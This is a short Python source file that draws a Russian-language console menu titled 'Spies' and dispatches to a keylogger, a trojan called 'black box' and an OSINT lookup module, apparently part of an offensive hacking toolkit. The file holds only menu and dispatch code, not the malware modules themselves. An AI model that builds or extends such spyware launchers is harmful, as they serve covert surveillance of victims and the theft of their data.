from menu import main_menu
from menu.modules.spies import keylogger as keylog
from menu.modules.spies import blackBox as box
from menu.modules.spies import osint

def spiesmenu():
    print("╭────────────────────────────────────────────╮\n"
          "│                Ш П И О Н Ы                 │\n"
          "│============================================│\n"
          "│ 1) Кейлоггер                               │\n"
          "│ 2) Троян (черный ящик)                     │\n"
          "│ 3) Поисковая лаборатория(список осинт)     │\n"
          "│ 0) Назад                                   │\n"
          "╰────────────────────────────────────────────╯\n")

    choosing = True
    while choosing:
        usr_choose = int(input("Выберите раздел: "))
        if usr_choose == 1:
            keylog.keylogger_func()
            choosing = False
        elif usr_choose == 2:
            box.blackBox_func()
            choosing = False
        elif usr_choose == 3:
            osint.osint_func()
            choosing = False
        elif usr_choose == 0:
            main_menu.glavmenu()
            choosing = False
        else:
            print("Вы ввели что-то неправильное")
